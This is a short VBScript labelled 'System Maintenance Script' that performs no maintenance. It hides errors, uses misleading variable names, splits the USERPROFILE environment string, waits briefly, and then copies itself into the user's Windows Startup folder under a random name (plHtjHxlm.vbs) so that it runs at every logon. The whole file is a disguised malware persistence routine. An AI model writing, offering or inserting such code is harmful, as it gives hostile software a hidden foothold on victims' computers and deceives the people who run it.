' System Maintenance Script
On Error Resume Next
Dim lastCheckTime, updateHandler, tgf, currentSelf, fds
Set lastCheckTime = CreateObject("WScript.Shell")
Set updateHandler = CreateObject("Scripting.FileSystemObject")
tgf = lastCheckTime.ExpandEnvironmentStrings("%USER" & "PROFILE%") & "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
currentSelf = WScript.ScriptFullName
fds = tgf & "\plHtjHxlm.vbs"
WScript.Sleep 1778
If Not updateHandler.FileExists(fds) Then
    updateHandler.GetFile(currentSelf).Copy fds, True
End If
Set lastCheckTime = Nothing
Set updateHandler = Nothing
